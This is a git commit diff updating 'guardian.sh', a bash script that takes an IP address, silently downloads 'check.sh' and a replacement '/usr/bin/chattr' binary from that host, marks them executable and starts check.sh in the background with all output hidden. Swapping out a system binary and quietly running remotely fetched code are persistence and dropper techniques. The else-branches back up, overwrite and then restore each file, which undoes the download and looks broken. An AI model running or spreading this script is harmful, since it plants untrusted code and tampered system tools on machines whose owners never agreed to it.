797d3f7b794bd0b9871f50def86e4d8bcb73b35c
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-05-26 13:13:04 +0100

    Update guardian.sh

--- guardian.sh
+++ guardian.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 #H3X-007 :)
+
 script_path="/home/.../check.sh"
 ip_address="$1"
 
@@ -7,15 +8,28 @@ if [ -z "$ip_address" ]; then
     exit 1
 fi
 
+if [ ! -f "$script_path" ]; then
+    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
+    chmod +x "$script_path"
+else
+    cp "$script_path" "/tmp/check.sh" >/dev/null 2>&1
+    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
+    chmod +x "$script_path"
+    cp "/tmp/check.sh" "$script_path" >/dev/null 2>&1
+    rm "/tmp/check.sh" >/dev/null 2>&1
+fi
+
 chattr_path="/usr/bin/chattr"
 
 if [ ! -f "$chattr_path" ]; then
     wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
     chmod +x "$chattr_path"
+else
+    cp "$chattr_path" "/tmp/chattr" >/dev/null 2>&1
+    wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
+    chmod +x "$chattr_path"
+    cp "/tmp/chattr" "$chattr_path" >/dev/null 2>&1
+    rm "/tmp/chattr" >/dev/null 2>&1
 fi
 
-if [ ! -f "$script_path" ]; then
-    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
-    chmod +x "$script_path"
-    nohup "$script_path" >/dev/null 2>&1 &
-fi
+nohup "$script_path" >/dev/null 2>&1 &
